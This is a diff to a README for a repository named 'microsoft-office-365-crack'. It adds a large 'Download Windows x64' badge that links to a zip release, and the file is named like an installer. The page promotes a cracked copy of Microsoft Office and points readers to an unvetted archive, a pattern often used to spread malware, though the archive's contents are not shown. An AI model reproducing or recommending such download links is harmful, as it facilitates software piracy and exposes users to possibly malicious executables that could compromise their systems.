@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Windows%20x64-0078D6?style=for-the-badge&logo=windows)](https://github.com/james-n-hq1996y1/microsoft-office-365-crack/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # microsoft-office-365-crack
 
 Office-microsoft-365 — Download: [Download](../../releases/latest)
